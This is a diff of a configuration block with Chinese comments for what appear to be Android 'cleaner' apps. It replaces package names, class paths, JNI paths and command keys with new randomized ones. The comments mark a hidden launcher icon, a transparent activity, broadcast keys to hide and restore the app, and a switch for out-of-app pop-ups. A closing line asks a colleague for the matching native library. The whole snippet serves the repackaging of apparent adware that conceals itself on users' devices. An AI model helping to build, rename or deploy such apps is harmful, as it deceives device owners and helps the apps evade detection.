@@ -1,22 +1,22 @@
 // 这里面的信息都需要修改
-ncku['com.desolation.spreads.reach', 'com.keep.devicesfresh.ppowerclean',  # 包名
-               'zj.go.show.TouShow',# 透明activity
-               'azshow/ACanR',  #  广播
-               '','com.desolation.spreads.reach.NcName',  # 隐藏图标 other1","main2
-               'azshow/sl/lo', '"loTx"',  # jni路径及函数
-               '/mkhhj',# 外弹文件开关名
-               '"kkohy"',# 广播接收key
-               '"tofu"',  # 恢复
-               '"tohe"',  # 隐藏
-               '"kuang"']  # 外弹
+cnvb['com.eighth.day.lunar', 'com.cleansonic.sda.junkvanish',  # 包名
+               'vrv.bggt.Vnn',# 透明activity
+               'nnc/lk/HunR',  #  广播
+               '','com.eighth.day.lunar.EcQi',  # 隐藏图标 other1","main2
+               'ecf/jk/Kac', '"snnPl"',  # jni路径及函数
+               '/qpwo',# 外弹文件开关名
+               '"eiru"',# 广播接收key
+               '"tyal"',  # 恢复
+               '"skdj"',  # 隐藏
+               '"polk"']  # 外弹
 
 
-ncan['com.desolation.spreads.reach', 'com.keep.devicesfresh.ppowerclean',  # 包名
-                  'azshow/sl/lo',
-                   '"loh"','"loc"', '"lod"',
-                  'azshow/NcH',  # hander
-                  'azshow/NcVc',  # wvcClass WebViewClient
-                  'azshow/McCc',  # WccClass WebChormeClient
-                  '/mkhhj']#文件开关
+djfhg['com.eighth.day.lunar', 'com.cleansonic.sda.junkvanish',  # 包名
+                  'ecf/jk/Kac',
+                   '"nneCs"','"nneCp"', '"nneCz"',
+                  'ncc/kg/SnnA',  # hander
+                  'ncc/kg/Fgjh',  # wvcClass WebViewClient
+                  'ncc/kg/Ritu',  # WccClass WebChormeClient
+                  '/qpwo']#文件开关
 
-钟哥，给一下H5的So呢，包名：com.keep.devicesfresh.ppowerclean
+钟哥，给一下H5的So呢，包名：com.cleansonic.sda.junkvanish
